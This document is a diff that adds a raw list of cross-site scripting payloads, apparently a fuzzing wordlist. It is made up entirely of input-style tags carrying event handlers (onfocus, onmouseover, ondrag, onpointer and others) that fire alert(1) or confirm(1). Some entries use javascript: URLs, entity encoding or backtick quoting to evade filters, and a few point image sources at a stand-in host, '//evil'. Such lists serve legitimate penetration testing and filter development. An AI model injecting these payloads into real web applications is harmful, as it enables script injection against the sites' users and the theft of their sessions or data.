@@ -1,0 +1,178 @@
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocusin=alert(1)>
+<input id=11 name=s value=`aa`onclick=alert(/xss/)>
+<input value:aa/onclick=alert(/xss/)>
+<input value=<><iframe/src=javascript:confirm(1)
+<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
+<input draggable="true" ondrag="alert(1)">test</input>
+<input draggable="true" ondragend="alert(1)">test</input>
+<input draggable="true" ondragenter="alert(1)">test</input>
+<input draggable="true" ondragleave="alert(1)">test</input>
+<input draggable="true" ondragstart="alert(1)">test</input>
+<input id=x onfocus=alert(1)>
+<input id=x onfocusin=alert(1)>
+<input autofocus onblur=alert(1)>
+<input id=x tabindex=1 onactivate=alert(1)></input>
+<input id=x tabindex=1 onbeforeactivate=alert(1)></input>
+<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>
+<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>
+<input onafterscriptexecute=alert(1)><script>1</script>
+<input onauxclick=alert(1)>
+<input onbeforecopy=alert(1) value="XSS" autofocus>
+<input onbeforecut=alert(1) value="XSS" autofocus>
+<input onbeforepaste=alert(1) value="" autofocus>
+<input onbeforescriptexecute=alert(1)><script>1</script>
+<input onblur=alert(1) id=x><input autofocus>
+<input onchange=alert(1) value=xss>
+<input onclick="alert(1)">test</input>
+<input oncontextmenu="alert(1)">test</input>
+<input oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<input oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<input ondblclick="alert(1)" autofocus tabindex=1>test</input>
+<input onfocusout=alert(1) id=x><input autofocus>
+<input oninput=alert(1) value=xss>
+<input onkeydown="alert(1)" contenteditable>test</input>
+<input onkeypress="alert(1)" contenteditable>test</input>
+<input onkeyup="alert(1)" contenteditable>test</input>
+<input onmousedown="alert(1)">test</input>
+<input onmouseenter="alert(1)">test</input>
+<input onmouseleave="alert(1)">test</input>
+<input onmousemove="alert(1)">test</input>
+<input onmouseout="alert(1)">test</input>
+<input onmouseover="alert(1)">test</input>
+<input onmouseup="alert(1)">test</input>
+<input onmousewheel=alert(1)>requires scrolling
+<input onpaste=alert(1) value="" autofocus>
+<input onpointerdown=alert(1)>XSS</input>
+<input onpointerenter=alert(1)>XSS</input>
+<input onpointerleave=alert(1)>XSS</input>
+<input onpointermove=alert(1)>XSS</input>
+<input onpointerout=alert(1)>XSS</input>
+<input onpointerover=alert(1)>XSS</input>
+<input onpointerrawupdate=alert(1)>XSS</input>
+<input onpointerup=alert(1)>XSS</input>
+<input onselect=alert(1) value="XSS" autofocus>
+<input type=checkbox id=x onfocus=alert(1)>
+<input type=checkbox id=x onfocusin=alert(1)>
+<input type=image onloadend=alert(1) src=validimage.png>
+<input type=image onloadstart=alert(1) src=validimage.png>
+<input type=image src=1 onerror=alert(1)>
+<input type=image src=validimage.png onload=alert(1)>
+<input type=image src="//evil?
+<input type=radio id=x onfocus=alert(1)>
+<input type=radio id=x onfocusin=alert(1)>
+<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<input type=hidden type=image src="//evil?
+<input onfocus=javascript:alert(1) autofocus>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<input value=<><iframe/src=javascript:confirm(1)
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<input autofocus onfocus=alert(1)>//INJECTX
+<input2 draggable="true" ondrag="alert(1)">test</input2>
+<input2 draggable="true" ondragend="alert(1)">test</input2>
+<input2 draggable="true" ondragenter="alert(1)">test</input2>
+<input2 draggable="true" ondragleave="alert(1)">test</input2>
+<input2 draggable="true" ondragstart="alert(1)">test</input2>
+<input2 id=x tabindex=1 onactivate=alert(1)></input2>
+<input2 id=x tabindex=1 onbeforeactivate=alert(1)></input2>
+<input2 id=x tabindex=1 onbeforedeactivate=alert(1)></input2><input autofocus>
+<input2 id=x tabindex=1 ondeactivate=alert(1)></input2><input id=y autofocus>
+<input2 onafterscriptexecute=alert(1)><script>1</script>
+<input2 onbeforescriptexecute=alert(1)><script>1</script>
+<input2 onclick="alert(1)">test</input2>
+<input2 oncontextmenu="alert(1)">test</input2>
+<input2 oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<input2 oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<input2 ondblclick="alert(1)" autofocus tabindex=1>test</input2>
+<input2 onkeydown="alert(1)" contenteditable>test</input2>
+<input2 onkeypress="alert(1)" contenteditable>test</input2>
+<input2 onkeyup="alert(1)" contenteditable>test</input2>
+<input2 onmousedown="alert(1)">test</input2>
+<input2 onmouseenter="alert(1)">test</input2>
+<input2 onmouseleave="alert(1)">test</input2>
+<input2 onmousemove="alert(1)">test</input2>
+<input2 onmouseout="alert(1)">test</input2>
+<input2 onmouseover="alert(1)">test</input2>
+<input2 onmouseup="alert(1)">test</input2>
+<input2 onmousewheel=alert(1)>requires scrolling
+<input2 onpointerdown=alert(1)>XSS</input2>
+<input2 onpointerenter=alert(1)>XSS</input2>
+<input2 onpointerleave=alert(1)>XSS</input2>
+<input2 onpointermove=alert(1)>XSS</input2>
+<input2 onpointerout=alert(1)>XSS</input2>
+<input2 onpointerover=alert(1)>XSS</input2>
+<input2 onpointerrawupdate=alert(1)>XSS</input2>
+<input2 onpointerup=alert(1)>XSS</input2>
+<input3 draggable="true" ondrag="alert(1)">test</input3>
+<input3 draggable="true" ondragend="alert(1)">test</input3>
+<input3 draggable="true" ondragenter="alert(1)">test</input3>
+<input3 draggable="true" ondragleave="alert(1)">test</input3>
+<input3 draggable="true" ondragstart="alert(1)">test</input3>
+<input3 id=x tabindex=1 onactivate=alert(1)></input3>
+<input3 id=x tabindex=1 onbeforeactivate=alert(1)></input3>
+<input3 id=x tabindex=1 onbeforedeactivate=alert(1)></input3><input autofocus>
+<input3 id=x tabindex=1 ondeactivate=alert(1)></input3><input id=y autofocus>
+<input3 onafterscriptexecute=alert(1)><script>1</script>
+<input3 onbeforescriptexecute=alert(1)><script>1</script>
+<input3 onclick="alert(1)">test</input3>
+<input3 oncontextmenu="alert(1)">test</input3>
+<input3 oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<input3 oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<input3 ondblclick="alert(1)" autofocus tabindex=1>test</input3>
+<input3 onkeydown="alert(1)" contenteditable>test</input3>
+<input3 onkeypress="alert(1)" contenteditable>test</input3>
+<input3 onkeyup="alert(1)" contenteditable>test</input3>
+<input3 onmousedown="alert(1)">test</input3>
+<input3 onmouseenter="alert(1)">test</input3>
+<input3 onmouseleave="alert(1)">test</input3>
+<input3 onmousemove="alert(1)">test</input3>
+<input3 onmouseout="alert(1)">test</input3>
+<input3 onmouseover="alert(1)">test</input3>
+<input3 onmouseup="alert(1)">test</input3>
+<input3 onmousewheel=alert(1)>requires scrolling
+<input3 onpointerdown=alert(1)>XSS</input3>
+<input3 onpointerenter=alert(1)>XSS</input3>
+<input3 onpointerleave=alert(1)>XSS</input3>
+<input3 onpointermove=alert(1)>XSS</input3>
+<input3 onpointerout=alert(1)>XSS</input3>
+<input3 onpointerover=alert(1)>XSS</input3>
+<input3 onpointerrawupdate=alert(1)>XSS</input3>
+<input3 onpointerup=alert(1)>XSS</input3>
+<input4 draggable="true" ondrag="alert(1)">test</input4>
+<input4 draggable="true" ondragend="alert(1)">test</input4>
+<input4 draggable="true" ondragenter="alert(1)">test</input4>
+<input4 draggable="true" ondragleave="alert(1)">test</input4>
+<input4 draggable="true" ondragstart="alert(1)">test</input4>
+<input4 id=x tabindex=1 onactivate=alert(1)></input4>
+<input4 id=x tabindex=1 onbeforeactivate=alert(1)></input4>
+<input4 id=x tabindex=1 onbeforedeactivate=alert(1)></input4><input autofocus>
+<input4 id=x tabindex=1 ondeactivate=alert(1)></input4><input id=y autofocus>
+<input4 onafterscriptexecute=alert(1)><script>1</script>
+<input4 onbeforescriptexecute=alert(1)><script>1</script>
+<input4 onclick="alert(1)">test</input4>
+<input4 oncontextmenu="alert(1)">test</input4>
+<input4 oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<input4 oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<input4 ondblclick="alert(1)" autofocus tabindex=1>test</input4>
+<input4 onkeydown="alert(1)" contenteditable>test</input4>
+<input4 onkeypress="alert(1)" contenteditable>test</input4>
+<input4 onkeyup="alert(1)" contenteditable>test</input4>
+<input4 onmousedown="alert(1)">test</input4>
+<input4 onmouseenter="alert(1)">test</input4>
+<input4 onmouseleave="alert(1)">test</input4>
+<input4 onmousemove="alert(1)">test</input4>
+<input4 onmouseout="alert(1)">test</input4>
+<input4 onmouseover="alert(1)">test</input4>
+<input4 onmouseup="alert(1)">test</input4>
+<input4 onmousewheel=alert(1)>requires scrolling
+<input4 onpointerdown=alert(1)>XSS</input4>
+<input4 onpointerenter=alert(1)>XSS</input4>
+<input4 onpointerleave=alert(1)>XSS</input4>
+<input4 onpointermove=alert(1)>XSS</input4>
+<input4 onpointerout=alert(1)>XSS</input4>
+<input4 onpointerover=alert(1)>XSS</input4>
+<input4 onpointerrawupdate=alert(1)>XSS</input4>
+<input4 onpointerup=alert(1)>XSS</input4>
